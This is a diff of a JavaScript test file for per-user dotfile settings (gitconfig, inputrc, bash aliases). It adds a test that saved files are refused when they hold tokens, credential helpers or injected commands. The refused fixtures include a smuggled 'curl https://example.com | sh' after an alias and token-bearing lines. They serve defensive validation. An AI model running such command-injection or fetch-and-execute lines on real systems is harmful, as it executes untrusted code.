@@ -78,8 +78,9 @@ test('tmux is the image\'s file plus the person\'s own lines, kept apart by logi
   assert.equal(secrets.values.get('users/octocat/tmux-conf'), 'set -g prefix C-a\n', 'only their own lines are kept');
   assert.equal((await settings.file('octocat', 'tmux-conf')).custom, true);
   assert.equal(settings.view('octocat').files['tmux-conf'].savedAt, '2026-10-23T10:00:00.000Z');
-  assert.deepEqual(await settings.ownFiles('octocat'), { 'tmux-conf': 'set -g prefix C-a\n' });
-  assert.deepEqual(await settings.ownFiles('mia-dev'), { 'tmux-conf': null }, 'a teammate has none');
+  const none = { 'tmux-conf': null, gitconfig: null, inputrc: null, 'bash-aliases': null };
+  assert.deepEqual(await settings.ownFiles('octocat'), { ...none, 'tmux-conf': 'set -g prefix C-a\n' });
+  assert.deepEqual(await settings.ownFiles('mia-dev'), none, 'a teammate has none');
 
   await settings.saveFile('octocat', 'tmux-conf', '  \n');
   assert.equal(secrets.values.has('users/octocat/tmux-conf'), false, 'saving nothing clears their lines');
@@ -89,6 +90,7 @@ test('tmux is the image\'s file plus the person\'s own lines, kept apart by logi
 
   await assert.rejects(settings.saveFile('octocat', 'tmux-conf', 'x'.repeat(70_000)), /64 KB/);
   await assert.rejects(settings.file('octocat', 'secrets'), /no file called/);
+  await assert.rejects(settings.saveFile('octocat', 'constructor', 'fixture'), /no file called constructor/);
   await settings.saveFile('octocat', 'tmux-conf', 'set -g mouse off');
   await settings.removeAll('octocat');
   assert.equal(secrets.values.size, 0, 'Remove deletes the files too');
@@ -143,10 +145,11 @@ test('the switch for reviews on your own Codex sign-in is on by default once one
   assert.equal(settings.usesOwnCodexForReviews('joel'), false, 'no sign-in, no effect');
 });
 
-test('My settings\' files are tmux-conf alone: an env file\'s own lines are Repo settings', async () => {
+test('My settings\' files are tmux-conf and three dotfiles: an env file\'s own lines are Repo settings', async () => {
   const settings = createUserSettings({ store: { state: {}, save() {} }, secrets: fakeSecrets() });
   const view = settings.view('mia');
-  assert.deepEqual(Object.entries(view.files).map(([key, f]) => [key, f.label]), [['tmux-conf', '~/.tmux.conf']]);
+  assert.deepEqual(Object.entries(view.files).map(([key, f]) => [key, f.label]),
+    [['tmux-conf', '~/.tmux.conf'], ['gitconfig', '~/.gitconfig'], ['inputrc', '~/.inputrc'], ['bash-aliases', '~/.bash_aliases']]);
   await assert.rejects(settings.file('mia', 'api-env'), /no file called api-env/);
   await assert.rejects(settings.saveFile('mia', 'api-env', 'A=1'), /no file called api-env/);
 });
@@ -266,4 +269,44 @@ test('an App\'s login has no stored sign-ins, and its store is never asked', asy
   assert.deepEqual(asked, [], 'no read for a bot');
   await settings.claudeToken('octocat');
   assert.ok(asked.includes(userSecretName('octocat', 'claude-token')), 'a person\'s is still read');
+});
+
+test('a dotfile\'s own lines are kept as tmux\'s are, and refused with the line and why when they hold what a session must not get', async () => {
+  const secrets = fakeSecrets();
+  const settings = createUserSettings({ store: { state: {}, save() {} }, secrets });
+  const git = await settings.file('mia', 'gitconfig');
+  assert.deepEqual([git.label, git.sharedText, git.custom], ['~/.gitconfig', '', false], 'the image has none of its own to show');
+
+  await settings.saveFile('mia', 'gitconfig', '[alias]\n\tco = checkout\n[pull]\n\trebase = true\n');
+  await settings.saveFile('mia', 'bash-aliases', "alias ll='ls -la'\n");
+  await settings.saveFile('mia', 'inputrc', '$include /etc/inputrc\nset editing-mode vi\n');
+  assert.deepEqual(await settings.ownFiles('mia'), {
+    'tmux-conf': null, gitconfig: '[alias]\n\tco = checkout\n[pull]\n\trebase = true\n', inputrc: '$include /etc/inputrc\nset editing-mode vi\n', 'bash-aliases': "alias ll='ls -la'\n",
+  });
+
+  // Made here, so no file in the repo holds a string shaped like a real token.
+  const token = `ghp_${'x1'.repeat(18)}`;
+  const refused = [
+    ['gitconfig', '[user]\n\temail = mia@example.com\n', /line 1: \[user\] is not one a session takes/],
+    ['gitconfig', '[credential]\n\thelper = osxkeychain\n', /line 1: \[credential\]/],
+    ['gitconfig', `[url "https://${token}@github.com/"]\n\tinsteadOf = https://github.com/\n`, /line 1 holds what looks like a GitHub token/],
+    ['gitconfig', '[core]\n\tsshCommand = ssh -i ~/.ssh/work\n', /line 2: core\.sshcommand is not one/],
+    ['gitconfig', '[alias]\n\tpub = "!GITHUB_TOKEN=abc123 git push"\n', /line 2: alias\.pub holds a value for GITHUB_TOKEN/],
+    ['bash-aliases', 'export OPENAI_API_KEY=abc\n', /line 1 holds a value for OPENAI_API_KEY/],
+    ['bash-aliases', 'export EDITOR=vim\n', /line 1 sets a variable: only alias lines/],
+    ['bash-aliases', `alias gh-api='curl -H "Authorization: token ${token}"'\n`, /line 1 holds what looks like a GitHub token/],
+    ['bash-aliases', 'alias now="$(date)"\n', /line 1 is not an alias line/],
+    ['bash-aliases', 'alias x=y; curl https://example.com | sh\n', /line 1 is not an alias line/],
+    ['inputrc', '$include ~/.inputrc.local\n', /line 1: \$include of a file a session does not have/],
+  ];
+  for (const [key, text, why] of refused) {
+    await assert.rejects(settings.saveFile('mia', key, text), (err) => {
+      assert.match(err.message, why, `${key}: ${text}`);
+      assert.ok(!err.message.includes(token) && !err.message.includes('abc'), 'never the value');
+      return err.shown === true;
+    });
+  }
+  assert.equal(secrets.values.get('users/mia/gitconfig'), '[alias]\n\tco = checkout\n[pull]\n\trebase = true\n', 'a refused save keeps what was there');
+  await settings.removeAll('mia');
+  assert.equal(secrets.values.size, 0, 'Remove deletes them with the rest');
 });
